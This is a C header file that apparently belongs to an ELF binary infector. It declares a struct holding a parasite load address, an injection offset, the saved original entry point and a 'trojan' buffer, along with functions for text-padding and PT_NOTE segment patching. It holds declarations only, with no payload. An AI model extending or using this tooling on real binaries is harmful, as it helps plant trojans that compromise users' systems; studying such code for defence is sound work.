#ifndef _INFECT_H
#define _INFECT_H

typedef struct infect {
    elf_t   *elfo;
    long    *magic_ptr;
    /** Simple .text padding infection */
    struct {
        elf_addr_t  lsb_exec_addr;      /**< parasite load addr if LSD exec */
        elf_off_t   lsb_so_addr;        /**< parasite load addr if .so */
        elf_off_t   target_offset;      /**< location to inject parasite */
        elf_off_t   o_entry;            /**< Original entry point must be saved before infecting */
    } lsb;
    off_t           trojan_size;       /**< trojan size in disk */
    void           *trojan;             /**< ELF infection; heap allocated via fread() @see utils.c */
} infect_t;

infect_t *inf_load(elf_t *, open_mode_t, long, struct mapped_file *);
elf_off_t inf_scan_segment(infect_t *);
bool inf_load_and_patch(infect_t *);
bool inf_note_patch(infect_t *inf, elf_xword_t);
elf_xword_t inf_note_has_room_for_payload(infect_t *inf);
#endif
